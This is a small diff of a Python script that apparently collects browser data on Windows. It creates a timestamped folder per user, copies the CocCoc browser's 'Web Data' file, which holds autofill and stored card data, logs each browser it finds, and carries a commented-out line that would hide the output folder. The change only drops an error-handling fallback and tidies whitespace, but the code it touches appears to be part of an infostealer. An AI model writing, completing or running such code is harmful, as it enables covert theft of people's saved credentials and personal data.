@@ -48,11 +48,7 @@ try:
 		time = time.replace(":", "-", 2)
 		dirname = user + "_" + time
 		
-		try:
-			os.makedirs(path + "\\" + dirname)
-		except FileExistsError:
-			dirname = user + "_" + date
-			os.makedirs(path + "\\" + dirname)
+		os.makedirs(path + "\\" + dirname)
 		dio = path + "\\" + dirname
 
 		os.makedirs(dio + "\\Documents")
@@ -294,11 +290,8 @@ try:
 					find("Web Data", src, "\\CocCoc\\")
 					print(" 	{+} CocCoc")
 				except OSError:
-					print(" 	{+} CocCoc")
-			
-				
+					print(" 	{+} CocCoc")	
 		browsers()
-
 		print(")")
 		fileg.write("\n)")
 		#ctypes.windll.kernel32.SetFileAttributesW(dio, 0x02)
